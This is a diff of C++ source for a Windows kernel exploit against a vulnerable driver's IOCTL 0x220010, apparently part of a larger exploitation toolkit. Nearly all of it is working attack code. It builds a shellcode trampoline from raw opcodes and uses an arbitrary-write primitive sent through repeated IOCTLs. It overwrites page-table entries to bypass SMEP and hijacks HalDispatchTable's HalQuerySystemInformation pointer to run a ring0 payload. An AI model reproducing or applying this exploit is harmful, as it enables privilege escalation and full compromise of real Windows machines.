@@ -9,12 +9,6 @@
 */
 #include "stdafx.h"
 
-// make crt functions inline
-#pragma intrinsic(memcpy)
-
-// uncomment to use ROP for SMEP bypass
-/* #define USE_ROP */
-
 //
 // Constants for vulnerable driver
 //
@@ -22,84 +16,8 @@
 #define EXPL_CONTROL_CODE   0x220010
 #define EXPL_DEVICE_PATH    SNCC0_DEVICE_PATH
 
-typedef struct _KERNEL_EXPL_CONTEXT
-{
-    // information about successful execution of _r0_proc_continue()
-    BOOL bExplOk;
-
-    // information caller specified ring0 payload
-    KERNEL_EXPL_HANDLER Handler;
-    PVOID HandlerContext;
-
-    // information about kernel environment
-    PHAL_DISPATCH HalDispatchTable;
-    func_ExAllocatePool f_ExAllocatePool;
-
-} KERNEL_EXPL_CONTEXT,
-*PKERNEL_EXPL_CONTEXT;
-
 static PVOID m_Rop_Mov_Cr4 = NULL;
-static KERNEL_EXPL_CONTEXT m_Context;
-
-extern "C"
-{
-void WINAPI GetCPUIDFeatureBits(DWORD EaxValue, PDWORD EcxValue, PDWORD EdxValue, PDWORD EbxValue);
-
-// functions used in ring0 shellcode
-void WINAPI _r0_proc_begin(PKERNEL_EXPL_CONTEXT pContext);
-void WINAPI _r0_proc_end(void);
-void WINAPI _r0_proc_continue(void);
-}
-//--------------------------------------------------------------------------------------
-void WINAPI _r0_proc_begin(PKERNEL_EXPL_CONTEXT pContext)
-{    
-
-#if defined(_X86_)
-
-#define TEMP_CODE_LEN 8
-
-    char TempCode[] =
-    {
-        '\xB8', '\x01', '\x00', '\x00', '\xC0',  // mov      eax, 0xC00000001 
-        '\xC2', '\x1C', '\x00'                   // retn     0x1C
-    };
-
-#elif defined(_AMD64_)            
-
-#define TEMP_CODE_LEN 6
-
-    char TempCode[] =
-    {
-        '\xB8', '\x01', '\x00', '\x00', '\xC0',  // mov      eax, 0xC00000001 
-        '\xC3'                                   // retn
-    };
-
-#endif
-
-    // allocate code buffer to restore HAL_DISPATCH::HalQuerySystemInformation pointer
-    if (pContext->HalDispatchTable->HalQuerySystemInformation = pContext->f_ExAllocatePool(NonPagedPool, TEMP_CODE_LEN))
-    {
-        memcpy(pContext->HalDispatchTable->HalQuerySystemInformation, TempCode, TEMP_CODE_LEN);
-    }
-
-    if (pContext->Handler)
-    {
-        // call external ring0 payload handler
-        pContext->Handler(pContext->HandlerContext);
-    }
-
-    pContext->bExplOk = TRUE;
-}
-//--------------------------------------------------------------------------------------
-void WINAPI _r0_proc_end(void)
-{
-    return;
-}
-//--------------------------------------------------------------------------------------
-void WINAPI _r0_proc_continue(void)
-{
-    _r0_proc_begin(&m_Context);
-}
+extern KERNEL_EXPL_CONTEXT m_Context;
 //--------------------------------------------------------------------------------------
 NTSTATUS WINAPI _r0_proc_HalQuerySystemInformation(
     ULONG InformationClass,
@@ -330,7 +248,7 @@ BOOL expl_SNCC0_Sys_220010(KERNEL_EXPL_HANDLER Handler, PVOID HandlerContext)
     }
 
     DbgMsg(__FILE__, __LINE__, "nt!ExAllocatePool() is at "IFMT"\n", m_Context.f_ExAllocatePool);
-    DbgMsg(__FILE__, __LINE__, "nt!HalDispatchTable is at "IFMT"\n", m_Context.HalDispatchTable);
+    DbgMsg(__FILE__, __LINE__, "nt!HalDispatchTable is at "IFMT"\n", m_Context.HalDispatchTable);    
 
     LARGE_INTEGER Val;
     PVOID Trampoline = NULL;    
@@ -348,13 +266,7 @@ BOOL expl_SNCC0_Sys_220010(KERNEL_EXPL_HANDLER Handler, PVOID HandlerContext)
 
     // special value that corresponds to isolated paging structures
     DWORD64 TargetAddr = 0x100804020001;
-    DWORD64 TargetVal = 0x6300000000000000;
-
-    // determinate virtual addresses of necassary paging structures
-    DWORD64 PT = VA_to_PT(TargetAddr);
-    DWORD64 PD = VA_to_PD(TargetAddr);
-    DWORD64 PDPT = VA_to_PDPT(TargetAddr);
-    DWORD64 PML4 = VA_to_PML4(TargetAddr);
+    DWORD64 TargetVal = 0x6300000000000000;    
 
 #endif // USE_ROP
 
@@ -439,9 +351,14 @@ BOOL expl_SNCC0_Sys_220010(KERNEL_EXPL_HANDLER Handler, PVOID HandlerContext)
 
         DWORD Ptr = 0, PtrAddr = 0;
 
-        // MOV RCX, m_Context
+        // MOV RCX, pContext
         *(PWORD)((DWORD_PTR)Trampoline + Ptr) = 0xb948;
         *(PDWORD_PTR)((DWORD_PTR)Trampoline + Ptr + sizeof(WORD)) = (DWORD_PTR)&m_Context;
+        Ptr += 10;
+
+        // MOV RDX, ShellcodeAddr
+        *(PWORD)((DWORD_PTR)Trampoline + Ptr) = 0xba48;
+        *(PDWORD_PTR)((DWORD_PTR)Trampoline + Ptr + sizeof(WORD)) = (DWORD_PTR)Trampoline;
         Ptr += 10;
 
         // MOV RAX, _r0_proc_begin
@@ -452,21 +369,21 @@ BOOL expl_SNCC0_Sys_220010(KERNEL_EXPL_HANDLER Handler, PVOID HandlerContext)
         PtrAddr = Ptr;
         Ptr += 10;
 
-        // SUB RSP, 08h ; restore proper stack pointer value
-        *(PDWORD)((DWORD_PTR)Trampoline + Ptr) = 0x08ec8348;
+        // SUB RSP, 28h ; restore proper stack pointer value
+        *(PDWORD)((DWORD_PTR)Trampoline + Ptr) = 0x28ec8348;
         Ptr += 4;
 
         // CALL RAX ; calls _r0_proc_begin()
         *(PWORD)((DWORD_PTR)Trampoline + Ptr) = 0xd0ff;
         Ptr += 2;
 
-        // ADD RSP, 08h ; restore proper stack pointer value
-        *(PDWORD)((DWORD_PTR)Trampoline + Ptr) = 0x08c48348;
+        // ADD RSP, 28h ; restore proper stack pointer value
+        *(PDWORD)((DWORD_PTR)Trampoline + Ptr) = 0x28c48348;
         Ptr += 4;
 
         // MOV RAX, 0xC00000001
         *(PWORD)((DWORD_PTR)Trampoline + Ptr) = 0xb848;
-        *(PDWORD_PTR)((DWORD_PTR)Trampoline + Ptr + sizeof(WORD)) = 0xC00000001;
+        *(PDWORD_PTR)((DWORD_PTR)Trampoline + Ptr + sizeof(WORD)) = 0xc00000001;
         Ptr += 10;
 
         // RET ; return back to the nt!NtQueryntervalProfile()
@@ -480,13 +397,8 @@ BOOL expl_SNCC0_Sys_220010(KERNEL_EXPL_HANDLER Handler, PVOID HandlerContext)
 
         if (m_Context.Handler)
         {
-            // calculate offset of the handler from the beginning of the shellcode
-            DWORD dwHandlerOffset = (DWORD)((DWORD_PTR)m_Context.Handler - (DWORD_PTR)&_r0_proc_begin);
-
             // switch handler to the copied code
-            m_Context.Handler = (KERNEL_EXPL_HANDLER)RVATOVA(Trampoline, Ptr + dwHandlerOffset);
-
-            DbgMsg(__FILE__, __LINE__, "Address of the ring0 payload handler is "IFMT"\n", m_Context.Handler);
+            m_Context.Handler = (KERNEL_EXPL_HANDLER)((DWORD_PTR)m_Context.Handler - (DWORD_PTR)&_r0_proc_begin + Ptr);
         }
 
 #endif // USE_ROP
@@ -559,41 +471,49 @@ BOOL expl_SNCC0_Sys_220010(KERNEL_EXPL_HANDLER Handler, PVOID HandlerContext)
     */
     *(PDWORD)&Buff[0x5c] = 0;
 
-    #define OVERWITE(_addr_, _val_)                                                                 \
+    #define OVERWITE_DWORD(_addr_, _val_)                                                           \
+                                                                                                    \
+        *(PDWORD)&Buff[0x58] = (_val_);                                                             \
+        *(PDWORD64)&Buff[0x00] = (DWORD64)((PUCHAR)(_addr_) - 0x18);                                \
+                                                                                                    \
+        /* overwrite single dword */                                                                \
+        SEND_IOCTL(EXPL_CONTROL_CODE, (PVOID)&Buff, sizeof(Buff), (PVOID)&Buff, sizeof(Buff));      \
+
+    #define OVERWITE_DWORD_PTR(_addr_, _val_)                                                       \
                                                                                                     \
         Val.QuadPart = (DWORD64)(_val_);                                                            \
                                                                                                     \
-        *(PDWORD)&Buff[0x58] = Val.LowPart;                                                         \
-        *(PDWORD64)&Buff[0x00] = (DWORD64)((PUCHAR)(_addr_) - 0x18);                                \
-                                                                                                    \
         /* overwrite lower dword */                                                                 \
-        SEND_IOCTL(EXPL_CONTROL_CODE, (PVOID)&Buff, sizeof(Buff), (PVOID)&Buff, sizeof(Buff));      \
-                                                                                                    \
-        *(PDWORD)&Buff[0x58] = Val.HighPart;                                                        \
-        *(PDWORD64)&Buff[0x00] += sizeof(DWORD);                                                    \
+        OVERWITE_DWORD((DWORD_PTR)(_addr_), Val.LowPart);                                           \
                                                                                                     \
         /* overwrite higher dword */                                                                \
-        SEND_IOCTL(EXPL_CONTROL_CODE, (PVOID)&Buff, sizeof(Buff), (PVOID)&Buff, sizeof(Buff));
+        OVERWITE_DWORD((DWORD_PTR)(_addr_) + sizeof(DWORD), Val.HighPart);    
 
 #ifndef USE_ROP    
-
+    
     if (bBypassSMEP)
     {
+        // determinate virtual addresses of necassary paging structures
+        DWORD64 PT = VA_to_PT(TargetAddr);
+        DWORD64 PD = VA_to_PD(TargetAddr);
+        DWORD64 PDPT = VA_to_PDPT(TargetAddr);
+        DWORD64 PML4 = VA_to_PML4(TargetAddr);
+
         // overwrite paging structures and make shellcode trampoline executable from kernel mode
-        OVERWITE(PT - 7, TargetVal);
-        OVERWITE(PD - 7, TargetVal);
-        OVERWITE(PDPT - 7, TargetVal);
-        OVERWITE(PML4 - 7, TargetVal);
+        OVERWITE_DWORD_PTR(PT - 7, TargetVal);
+        OVERWITE_DWORD_PTR(PD - 7, TargetVal);
+        OVERWITE_DWORD_PTR(PDPT - 7, TargetVal);
+        OVERWITE_DWORD_PTR(PML4 - 7, TargetVal);
 
         // overwrite HAL_DISPATCH_TABLE function pointer with shellcode trampoline address
-        OVERWITE(&m_Context.HalDispatchTable->HalQuerySystemInformation, Trampoline);
+        OVERWITE_DWORD_PTR(&m_Context.HalDispatchTable->HalQuerySystemInformation, Trampoline);
     }
     else
 
 #endif // USE_ROP
 
     {
-        OVERWITE(&m_Context.HalDispatchTable->HalQuerySystemInformation, Val.QuadPart);
+        OVERWITE_DWORD_PTR(&m_Context.HalDispatchTable->HalQuerySystemInformation, Val.QuadPart);
     }
 
 #else
